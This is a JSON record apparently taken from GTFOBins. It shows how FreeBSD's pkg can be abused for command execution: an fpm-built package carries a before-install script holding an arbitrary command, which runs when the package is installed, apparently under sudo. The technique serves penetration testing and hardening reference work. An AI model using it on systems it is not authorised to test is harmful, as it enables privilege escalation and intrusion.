{"title": "pkg", "source": "gtfobins", "source_label": "GTFOBins", "path": "pkg", "html": "<h1>pkg</h1>\n<h2>Command Execution</h2>\n<p>Generate the FreeBSD package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\necho /path/to/command &gt;x.sh\nfpm -n x -s dir -t freebsd -a all --before-install x.sh .\n```</p>\n<pre><code class=\"language-bash\">pkg install -y --no-repo-update ./x-1.0.txz</code></pre>", "excerpt": "pkg Command Execution Generate the FreeBSD package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target. ``` echo /path/to/command &gt;x.sh fpm -n x -s dir -t freebsd -a all --before-install x.sh . ``` pkg install -y…", "tags": ["func:command", "ctx:sudo"]}